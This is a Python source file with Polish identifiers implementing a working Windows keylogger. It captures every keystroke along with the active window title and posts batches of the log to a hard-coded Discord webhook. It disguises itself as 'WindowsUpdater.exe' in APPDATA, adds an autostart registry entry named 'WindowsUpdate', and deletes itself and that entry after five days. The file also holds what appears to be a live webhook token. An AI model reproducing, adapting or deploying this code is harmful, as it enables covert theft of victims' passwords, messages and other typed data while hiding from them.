import pynput.keyboard
import requests
import pygetwindow as gw
import os
import shutil
import sys
import threading
from datetime import datetime, timedelta

# --- KONFIGURACJA ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1479509765259526154/ixmMSGvfugJAXBzas_oA5-rcKWj0XJ9YTaQ9mHjHkAzOG9y4RW1Wqhv65je-NnpmCELh"
LIMIT_ZNAKOW = 450
DNI_DO_USUNIECIA = 5
# --------------------

log = ""
ostatnie_okno = ""

def sprawdz_samozniszczenie(sciezka_pliku):
    data_file = sciezka_pliku + ".date"
    teraz = datetime.now()
    if not os.path.exists(data_file):
        with open(data_file, "w") as f:
            f.write(teraz.strftime("%Y-%m-%d"))
        return False
    with open(data_file, "r") as f:
        try:
            data_instalacji = datetime.strptime(f.read().strip(), "%Y-%m-%d")
        except:
            return False
    if teraz > data_instalacji + timedelta(days=DNI_DO_USUNIECIA):
        os.system(f'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /f')
        os.system(f'start /b "" cmd /c timeout /t 5 & del "{sciezka_pliku}" & del "{data_file}"')
        sys.exit()

def autostart_i_ukrycie():
    appdata = os.getenv("APPDATA")
    sciezka_docelowa = os.path.join(appdata, "WindowsUpdater.exe")
    if sys.executable != sciezka_docelowa:
        try:
            shutil.copy(sys.executable, sciezka_docelowa)
            os.system(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /t REG_SZ /d "{sciezka_docelowa}" /f')
        except:
            pass
    return sciezka_docelowa

def wyslij_na_discord(wiadomosc):
    payload = {"content": wiadomosc}
    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
    except:
        pass

def procesuj_klawisze(key):
    global log, ostatnie_okno
    try:
        aktualne_okno = gw.getActiveWindowTitle()
    except:
        aktualne_okno = "System"
    
    if aktualne_okno != ostatnie_okno:
        log += f"\n\n[OKNO: {aktualne_okno}]\n"
        ostatnie_okno = aktualne_okno

    try:
        log += str(key.char)
    except AttributeError:
        if key == pynput.keyboard.Key.space: log += " "
        elif key == pynput.keyboard.Key.enter: log += "\n"
        else: log += f" [{str(key).replace('Key.', '')}] "

    if len(log) >= LIMIT_ZNAKOW:
        threading.Thread(target=wyslij_na_discord, args=(log,)).start()
        log = ""

# --- START ---
sciezka = autostart_i_ukrycie()
sprawdz_samozniszczenie(sciezka)

with pynput.keyboard.Listener(on_press=procesuj_klawisze) as listener:
    listener.join()